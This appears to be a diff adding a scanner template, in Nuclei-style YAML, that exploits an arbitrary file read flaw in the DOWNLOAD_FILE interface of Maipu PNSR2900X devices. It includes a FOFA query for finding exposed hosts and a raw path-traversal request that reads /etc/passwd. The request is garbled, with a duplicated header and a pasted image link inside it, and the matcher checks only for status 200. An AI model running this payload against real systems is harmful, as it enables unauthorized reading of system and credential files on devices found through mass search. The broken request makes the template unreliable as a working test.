@@ -1,0 +1,27 @@
+id: poc-tqxmwwmqbp5inlkg
+info:
+  name: 迈普pnsr2900x系统接口DOWNLOAD_FILE任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tqxmwwmqbp5inlkg'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tqxmwwmqbp5inlkg
+    fofa: body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"
+http:
+- raw:
+  - 'GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    Connection: keep-alive
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984857789-6aa830e7-2633-48cf-8026-c9b889351d53.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
